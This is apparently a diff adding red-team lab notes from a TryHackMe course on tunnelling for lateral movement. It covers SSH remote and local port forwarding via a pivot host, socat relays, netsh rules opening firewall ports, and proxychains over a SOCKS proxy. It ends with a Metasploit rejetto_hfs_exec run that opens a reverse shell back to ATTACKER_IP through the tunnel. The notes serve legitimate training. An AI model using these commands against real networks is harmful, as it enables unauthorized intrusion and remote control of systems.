@@ -25,3 +25,95 @@ Psexec
     Required Group Memberships: Administrators
 
 Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded here.
+
+
+SSH Tunnelling
+
+firstly add a user for port forwarding 
+useradd tunneluser -m -d /home/tunneluser -s /bin/true
+passwd tunneluser
+
+Windows:
+ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+
+This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
+
+Since the tunneluser isn't allowed to run a shell on the Attacker PC, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers don't need to match, although they do in this example.
+
+Linux:
+xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
+
+
+SSH Local Port Forwarding
+
+Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.
+
+ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+
+The command structure is similar to the one used in remote port forwarding but uses the -L option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (*:80) and the remote socket to connect to from the attacker's PC perspective (127.0.0.1:80).Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with dir=in). Administrative privileges are needed for this:
+
+netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+
+Port Forwarding With socat
+C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+
+C:\> netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+        
+The fork option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing. If you don't include it, socat will close when the first connection made is finished.
+socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
+
+
+C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
+
+In this case, the SSH server will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.
+
+The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at /etc/proxychains.conf on your AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying:
+
+[ProxyList]
+socks4  127.0.0.1 9050
+
+The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.
+
+If we now want to execute any command through the proxy, we can use proxychains:
+
+proxychains curl http://pxeboot.za.tryhackme.com
+Dynamic Port Forwarding and SOCKS
+
+
+Tunnelling Complex Exploits
+
+Rejetto HFS will be listening on port 80 on THMDC, so we need to tunnel that port back to our attacker's machine through THMJMP2 using remote port forwarding. Since the attackbox has port 80 occupied with another service, we will need to link port 80 on THMDC with some port not currently in use by the attackbox. Let's use port 8888. When running ssh in THMJMP2 to forward this port, we would have to add -R 8888:thmdc.za.tryhackme.com:80 to our command.
+
+For SRVPORT and LPORT, let's choose two random ports at will. For demonstrative purposes, we'll set SRVPORT=6666 and LPORT=7878, but be sure to use different ports as the lab is shared with other students, so if two of you choose the same ports, when trying to forward them, you'll get an error stating that such port is already in use on THMJMP2.
+
+To forward such ports from our attacker machine to THMJMP2, we will use local port forwarding by adding -L *:6666:127.0.0.1:6666 and -L *:7878:127.0.0.1:7878 to our ssh command. This will bind both ports on THMJMP2 and tunnel any connection back to our attacker machine.
+
+Putting the whole command together, we would end up with the following:
+
+C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
+
+Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:
+AttackBox
+
+user@AttackBox$ msfconsole
+msf6 > use rejetto_hfs_exec
+msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
+msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
+msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
+
+        
+The LHOST parameter usually serves two purposes: it is used as the IP where a listener is bound on the attacker's machine to receive a reverse shell; it is also embedded on the payload so that the victim knows where to connect back when the exploit is triggered. In our specific scenario, since THMDC won't be able to reach us, we need to force the payload to connect back to THMJMP2, but we need the listener to bind to the attacker's machine on 127.0.0.1. To this end, Metasploit provides an optional parameter ReverseListenerBindAddress, which can be used to specify the listener's bind address on the attacker's machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to 127.0.0.1 on the attacker's machine and the payload to connect back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).
+Our exploit must also run a web server to host and send the final payload back to the victim server. We use SRVHOST to indicate the listening address, which in this case is 127.0.0.1, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker's machine.
+The RHOSTS is set to point to 127.0.0.1 as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC.
+
+
+
+
